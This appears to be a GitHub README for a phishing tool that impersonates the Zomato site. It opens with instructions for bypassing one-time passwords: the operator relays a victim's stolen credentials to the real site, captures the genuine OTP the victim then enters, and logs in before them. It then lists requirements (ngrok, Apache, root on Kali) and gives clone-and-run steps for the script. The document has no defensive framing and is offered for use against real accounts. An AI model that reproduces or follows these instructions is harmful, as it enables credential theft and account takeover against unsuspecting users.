# OTP Bypass Instructions
When victim enter his credentials, you need to go to original website and use those credentials to send real OTP to victim. Once he enter that OTP such OTP will also be there with you and you will be allowed to login the account before him.

# Zomato-Phishing
This is a Zomato-Phishing Tool with OTP Bypass ! Zomato
you can also use AdvPhishing ...
![hi](https://user-images.githubusercontent.com/55870659/75668326-29af2900-5c47-11ea-976c-b6263fc96f03.png)


![zo](https://user-images.githubusercontent.com/55870659/75890141-f2ce4400-5dfb-11ea-8299-145f68062d8e.png)


# Requirements
1. ngrok setup
2. Root - Must
3. Apache Server
4. Internet
5. add repo on kali

# How to Intsall & Use
root ---must !
1. git clone https://github.com/Ignitetch/Zomato-Phishing.git
2. cd Zomato-Phishing
3. chmod 777 Zomato.sh
4. ./Zomato.sh

# Contact For Contribute
sg5479845@gmail.com

# Support
1 .Kali Linux  2. ubantu
